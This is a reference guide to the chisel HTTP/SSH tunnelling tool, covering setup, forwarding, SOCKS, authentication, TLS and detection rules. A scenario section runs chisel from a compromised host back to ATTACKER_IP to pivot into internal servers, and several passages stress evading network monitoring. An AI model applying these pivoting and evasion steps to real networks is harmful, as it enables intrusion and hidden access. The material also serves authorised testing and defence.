---
title: "chisel - Fast TCP/UDP Tunnel over HTTP"
description: "Go-based tunneling tool for port forwarding, SOCKS proxying, and network pivoting over HTTP with SSH encryption"
category: "tunneling"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
github: "https://github.com/jpillora/chisel"
kali_install: "sudo apt install chisel"
version: "1.11.6"
---

# chisel

## Overview

chisel is a fast TCP/UDP tunnel transported over HTTP and secured via SSH. Written in Go, it provides a single executable that functions as both client and server. chisel is designed for passing through firewalls, establishing secure endpoints into networks, and creating encrypted C2 channels that blend with normal HTTP traffic.

The tool creates an encrypted tunnel over HTTP, which allows it to bypass many network security controls. The SSH encryption layer ensures data confidentiality while the HTTP transport allows it to pass through firewalls that permit web traffic. chisel supports port forwarding, SOCKS proxying, and reverse tunneling with authentication and TLS encryption.

Key features include automatic reconnection with exponential backoff, SOCKS5 proxy support, reverse port forwarding, TLS encryption, and the ability to work behind CDNs like Cloudflare. The single binary design makes it easy to deploy on target systems without dependencies.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt update
sudo apt install chisel
```

### From GitHub Releases

```bash
# Download latest release for Linux amd64
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
mv chisel_linux_amd64 /usr/local/bin/chisel

# For ARM64
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_arm64.gz
gunzip chisel_linux_arm64.gz
chmod +x chisel_linux_arm64
mv chisel_linux_arm64 /usr/local/bin/chisel
```

### From Source

```bash
# Requires Go 1.21+
git clone https://github.com/jpillora/chisel.git
cd chisel
go build -o chisel .
sudo mv chisel /usr/local/bin/
```

### Docker

```bash
# Pull from Docker Hub
docker pull jpillora/chisel

# Or from GitHub Container Registry
docker pull ghcr.io/jpillora/chisel

# Run server
docker run --rm -it -p 8080:8080 jpillora/chisel server --port 8080

# Run client
docker run --rm -it jpillora/chisel client SERVER_IP:8080 R:8081:localhost:22
```

### Quick Install Script

```bash
curl https://i.jpillora.com/chisel! | bash
```

### Verify Installation

```bash
chisel version
```

## Chapter 2: Basic Usage

### Start Server

```bash
chisel server -p 8080
```

**Explanation**: Starts the chisel server on port 8080, listening for client connections. The server generates an ECDSA key pair and displays its fingerprint for client verification. The server handles multiple clients simultaneously.

### Connect Client

```bash
chisel client SERVER_IP:8080 R:8081:127.0.0.1:80
```

**Explanation**: The client connects to the server and creates a reverse tunnel. `R:8081:127.0.0.1:80` means the server listens on port 8081 and forwards traffic through the client to `127.0.0.1:80` on the client's network.

### Multiple Tunnels

```bash
chisel client SERVER_IP:8080 R:8081:target1:80 R:8082:target2:443 R:3306:db-server:3306
```

**Explanation**: Creates multiple reverse tunnels in a single client connection. Each `R:` prefix creates a separate tunnel. This allows accessing multiple internal services through one chisel connection.

### Server with Verbose Output

```bash
chisel server -p 8080 -v
```

**Explanation**: The `-v` flag enables verbose logging, showing connection details, authentication events, and tunnel establishment information. Useful for debugging connectivity issues.

## Chapter 3: Port Forwarding

### Local Forward

```bash
# Server
chisel server -p 8080

# Client
chisel client SERVER_IP:8080 8081:target_host:80
```

**Explanation**: Local port forwarding. The client listens on port 8081 and forwards connections through the tunnel to the target host's port 80 on the server's network. Applications on the client machine connect to `127.0.0.1:8081` to reach the remote service.

### Reverse Forward

```bash
# Server
chisel server -p 8080 --reverse

# Client
chisel client SERVER_IP:8080 R:8081:target_host:80
```

**Explanation**: Reverse port forwarding. The server listens on port 8081 and forwards connections through the client to the target. This exposes internal services to the server's network. The `--reverse` flag must be enabled on the server.

### UDP Forwarding

```bash
# Server
chisel server -p 8080 --reverse

# Client
chisel client SERVER_IP:8080 R:5353/udp:target_host:53/udp
```

**Explanation**: Forwards UDP traffic through the chisel tunnel. The `/udp` suffix specifies UDP protocol. Useful for DNS, SNMP, and other UDP-based services. UDP forwarding requires the `--reverse` flag on the server.

### SOCKS Proxy

```bash
# Server
chisel server -p 8080 --socks5

# Client
chisel client SERVER_IP:8080 socks
```

**Explanation**: Creates a local SOCKS5 proxy on port 1080. Applications configured to use this proxy can route traffic through the chisel tunnel to reach the server's network. The `--socks5` flag enables SOCKS support on the server.

### Custom SOCKS Port

```bash
chisel client SERVER_IP:8080 5000:socks
```

**Explanation**: Binds the SOCKS5 proxy to port 5000 instead of the default 1080. Applications connect to `127.0.0.1:5000` as their SOCKS proxy. Useful when port 1080 is already in use.

### Reverse SOCKS

```bash
# Server
chisel server -p 8080 --reverse --socks5

# Client
chisel client SERVER_IP:8080 R:socks
```

**Explanation**: Creates a SOCKS5 proxy on the server side. The server listens on port 1080 and routes traffic through the client's network. This allows the server to access the client's internal network through SOCKS.

## Chapter 4: Authentication

### Server with Authentication

```bash
chisel server -p 8080 --auth user:password
```

**Explanation**: The `--auth` flag requires clients to authenticate with username and password. Only clients providing matching credentials can establish tunnels. The auth string must include both username and password separated by a colon.

### Client with Authentication

```bash
chisel client SERVER_IP:8080 --auth user:password R:8081:target:80
```

**Explanation**: The client provides authentication credentials to the server. The server validates these against its configured credentials before allowing the tunnel.

### Auth File

```bash
# users.json
{
  "admin:secretpass": ["*"],
  "readonly:pass123": ["^10\\.0\\.0\\.1:.*$"],
  "tunneluser:tunnel123": ["^R:.*$"]
}

chisel server -p 8080 --authfile users.json
```

**Explanation**: An auth file defines multiple users with access control rules. Each user can have specific address patterns they're allowed to tunnel to, providing fine-grained access control. The file is reloaded automatically on changes.

### Auth File Format Details

The auth file supports regular expressions for address matching:
- `["*"]` - Allow all addresses
- `["^10\\.0\\.0\\.1:.*$"]` - Allow only 10.0.0.1
- `["^R:.*$"]` - Allow only reverse tunnels
- `["^socks$"]` - Allow SOCKS proxy access
- Empty string `""` matches everything

## Chapter 5: Security Features

### Key Fingerprint Verification

```bash
# Server displays fingerprint on startup
# Client verifies with --fingerprint
chisel client --fingerprint SERVER_FINGERPRINT SERVER_IP:8080 R:8081:target:80
```

**Explanation**: The `--fingerprint` flag validates the server's public key, preventing man-in-the-middle attacks. The fingerprint is displayed when the server starts. Use the SHA256 fingerprint (44 characters with trailing =) for verification.

### TLS Encryption

```bash
# With Let's Encrypt (requires port 443)
chisel server -p 443 --tls-domain example.com

# With custom certificate
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem

# Client with custom CA
chisel client --tls-ca ca.pem https://example.com 3000
```

**Explanation**: TLS wraps the HTTP transport layer. The inner SSH layer still encrypts and authenticates, providing double encryption. Let's Encrypt automatically provisions certificates when using `--tls-domain`.

### Client TLS Verification

```bash
chisel client --tls-ca ca.pem https://chisel.example.com 3000
```

**Explanation**: The client validates the server's TLS certificate against a custom CA. This is essential for self-signed or internal CA certificates.

### Mutual TLS

```bash
# Server
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --tls-ca ca.pem

# Client
chisel client --tls-ca ca.pem --tls-key client-key.pem --tls-cert client-cert.pem https://example.com 3000
```

**Explanation**: Mutual TLS requires both server and client to present certificates. The server validates the client's certificate against the CA, providing bidirectional authentication.

### Disable TLS Verification

```bash
chisel client --tls-skip-verify SERVER_IP:8080 3000
```

**Explanation**: The `--tls-skip-verify` flag disables TLS certificate verification. Use only for testing or when connecting to servers with self-signed certificates in controlled environments.

## Chapter 6: Advanced Features

### Auto-Reconnect

```bash
chisel client SERVER_IP:8080 --max-retry-count 10 --min-retry-interval 2s --max-retry-interval 5m R:8081:target:80
```

**Explanation**: The client automatically reconnects with exponential backoff. `--max-retry-count` limits reconnection attempts. `--min-retry-interval` and `--max-retry-interval` control the backoff timing. The default is unlimited retries.

### HTTP Proxy Pass-Through

```bash
chisel client SERVER_IP:8080 --proxy http://proxy:8080 R:8081:target:80
```

**Explanation**: The client connects through an HTTP proxy. This allows chisel to operate in environments where direct outbound connections are blocked but HTTP proxy access is available. Supports both HTTP CONNECT and SOCKS5 proxies.

### Custom Headers

```bash
chisel client SERVER_IP:8080 --header "X-Custom: value" --header "Authorization: Bearer token123" R:8081:target:80
```

**Explanation**: Custom HTTP headers are added to the WebSocket upgrade request. This can help blend chisel traffic with legitimate HTTP traffic or satisfy proxy requirements.

### Stdio Mode

```bash
ssh -o ProxyCommand='chisel client chiselserver stdio:%h:%p' user@example.com
```

**Explanation**: chisel operates over stdio, enabling SSH through HTTP tunnels. The SSH connection is tunneled through chisel's HTTP transport. Useful for SSH through restrictive firewalls.

### Reverse Proxy Mode

```bash
# Server acts as reverse proxy
chisel server -p 8080 --backend http://backend-server:3000
```

**Explanation**: The server doubles as a reverse proxy. Normal HTTP requests to the server are forwarded to the backend. This hides chisel in plain sight, serving real web content alongside the tunnel.

### Keepalive Configuration

```bash
# Disable keepalive for high-throughput
chisel client SERVER_IP:8080 --keepalive 0 R:8081:target:80

# Custom keepalive interval
chisel client SERVER_IP:8080 --keepalive 10s R:8081:target:80
```

**Explanation**: Adjust keepalive intervals for specific use cases. Disabling keepalive reduces overhead for high-throughput tunnels. The default is 25 seconds.

## Chapter 7: Environment Variables

### Available Environment Variables

```bash
# Client-side
CHISEL_WS_TIMEOUT=30s chisel server -p 8080
CHISEL_SSH_TIMEOUT=20s chisel client SERVER_IP:8080 R:8081:target:80

# Server-side
CHISEL_CONFIG_TIMEOUT=10s chisel server -p 8080
CHISEL_SHUTDOWN_GRACE=5s chisel server -p 8080

# Both sides
CHISEL_PING_TIMEOUT=30s chisel client SERVER_IP:8080
CHISEL_WS_READ_LIMIT=65536 chisel server -p 8080
CHISEL_WS_BUFF_SIZE=32768 chisel server -p 8080

# UDP-specific
CHISEL_UDP_MAX_SIZE=9012 chisel server -p 8080
CHISEL_UDP_DEADLINE=15s chisel server -p 8080
CHISEL_UDP_MAX_CONNS=100 chisel server -p 8080

# Server configuration
HOST=0.0.0.0 PORT=8080 AUTH=user:pass chisel server
```

**Explanation**: Environment variables control timeouts, buffer sizes, and other parameters. The `CHISEL_` prefix is required for most variables. These provide fine-grained control over chisel's behavior.

## Chapter 8: Operational Considerations

### Behind CDN (Cloudflare)

```bash
chisel server -p 443 --tls-domain tunnel.example.com
chisel client https://tunnel.example.com R:8081:target:80
```

**Explanation**: chisel works through CDNs like Cloudflare that support WebSockets. Enable WebSockets in the CDN configuration and use HTTPS for client connections. The CDN terminates TLS, but the inner SSH layer provides end-to-end encryption.

### Performance Tuning

```bash
# Increase buffer size for high throughput
CHISEL_WS_BUFF_SIZE=65536 chisel server -p 8080

# Disable keepalive for bulk transfers
chisel client SERVER_IP:8080 --keepalive 0 R:8081:target:80

# Adjust UDP settings
CHISEL_UDP_MAX_SIZE=9012 CHISEL_UDP_MAX_CONNS=200 chisel server -p 8080
```

**Explanation**: Adjust buffer sizes and timeouts for specific use cases. Larger buffers improve throughput for bulk data transfers. UDP settings control maximum packet size and concurrent flows.

### Key Management

```bash
# Generate a persistent key
chisel server --keygen /path/to/keyfile

# Use persistent key
chisel server --keyfile /path/to/keyfile -p 8080

# Generate key to stdout
chisel server --keygen -
```

**Explanation**: Persistent keys ensure the server fingerprint remains consistent across restarts. This is important for clients using `--fingerprint` validation. Without a persistent key, clients must update their fingerprint after each server restart.

### Signal Handling

```bash
# Graceful shutdown
kill -SIGTERM <pid>

# Force exit
kill -SIGINT <pid>

# Print stats
kill -SIGUSR2 <pid>

# Reset reconnect timer
kill -SIGHUP <pid>
```

**Explanation**: chisel responds to Unix signals. SIGTERM initiates graceful shutdown with HTTP request draining. SIGINT forces immediate exit. SIGUSR2 prints process statistics. SIGHUP resets the client reconnect timer.

### PID File Generation

```bash
chisel server -p 8080 --pid
chisel client SERVER_IP:8080 --pid
```

**Explanation**: The `--pid` flag generates a PID file in the current working directory. Useful for process management with systemd or other init systems.

## Chapter 9: Real-World Scenarios

### Pivoting into Internal Network

```bash
# On attacker (Kali)
chisel server -p 8080 --reverse

# On compromised host
./chisel client ATTACKER_IP:8080 R:3306:db-server:3306 R:445:file-server:445 R:8081:web-server:80
```

**Explanation**: After gaining access to a host, deploy chisel to pivot into the internal network. The reverse tunnels expose internal services to the attacker's machine without requiring inbound connections.

### SSH Tunneling Through HTTP

```bash
# Server
chisel server -p 443 --tls-domain tunnel.example.com

# Client
chisel client https://tunnel.example.com R:2222:localhost:22

# SSH through tunnel
ssh -p 2222 user@localhost
```

**Explanation**: Create an SSH tunnel through chisel's HTTP transport. The SSH connection appears as HTTPS traffic to network monitors. Useful for remote access when SSH is blocked.

### Database Access Through Firewall

```bash
# Server
chisel server -p 8080 --reverse

# Client
./chisel client SERVER_IP:8080 R:5432:db-server:5432

# Connect to database
psql -h localhost -p 5432 -U dbuser -d mydb
```

**Explanation**: Tunnel database connections through chisel when direct access is blocked by firewalls. The encrypted tunnel protects database credentials and queries.

### Multi-Client Setup

```bash
# Server with auth
chisel server -p 8080 --authfile users.json --socks5

# Client 1
chisel client SERVER_IP:8080 --auth user1:pass1 socks

# Client 2
chisel client SERVER_IP:8080 --auth user2:pass2 R:3306:db:3306
```

**Explanation**: Multiple clients can connect to the same server with different authentication credentials and tunnel configurations. The auth file controls which users can access which services.

## Chapter 10: Detection and Defense

### Network Signatures

- WebSocket upgrade requests on non-standard ports
- SSH key exchange within HTTP connections
- Unusual keepalive patterns in HTTP traffic
- Long-lived HTTP connections with high data transfer

### IDS/IPS Detection

```
# Suricata rule example
alert http any any -> any any (msg:"Chisel Tunnel Detected"; \
  content:"Upgrade"; content:"websocket"; \
  content:"Sec-WebSocket-Key"; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Look for WebSocket upgrades
grep -i "upgrade.*websocket" /var/log/nginx/access.log

# Look for unusual connection patterns
grep -E "^[0-9]+ [0-9]+.*8080" /var/log/apache2/access.log
```

### Defense Recommendations

1. Monitor for WebSocket connections to non-standard ports
2. Inspect TLS certificates for anomalies
3. Implement application-layer firewalls
4. Block WebSocket upgrades on unauthorized ports
5. Monitor for long-lived HTTP connections with high data volume

## Chapter 11: Troubleshooting

### Connection Refused

```bash
# Check server is running
ps aux | grep chisel

# Check port is listening
ss -tlnp | grep 8080

# Check firewall
iptables -L -n | grep 8080
```

### Authentication Failed

```bash
# Verify auth string format (must be user:pass)
chisel client SERVER_IP:8080 --auth user:pass

# Check auth file syntax
python3 -c "import json; print(json.load(open('users.json')))"
```

### TLS Certificate Issues

```bash
# Verify certificate
openssl x509 -in cert.pem -text -noout

# Test TLS connection
curl -v --cacert ca.pem https://chisel-server:443

# Skip verification for testing
chisel client --tls-skip-verify https://chisel-server:443 3000
```

### Tunnel Not Working

```bash
# Check server logs
chisel server -p 8080 -v

# Check client logs
chisel client SERVER_IP:8080 -v R:8081:target:80

# Test basic connectivity
curl http://SERVER_IP:8080
```

### Performance Issues

```bash
# Increase buffer size
CHISEL_WS_BUFF_SIZE=65536 chisel server -p 8080

# Disable keepalive
chisel client SERVER_IP:8080 --keepalive 0

# Check MTU settings
ip link show | grep mtu
```

## Resources

- [chisel GitHub Repository](https://github.com/jpillora/chisel)
- [chisel Releases](https://github.com/jpillora/chisel/releases)
- [Go Documentation](https://golang.org/doc/)
- [WebSocket Protocol RFC 6455](https://tools.ietf.org/html/rfc6455)
- [Kali Linux chisel Page](https://www.kali.org/tools/chisel/)
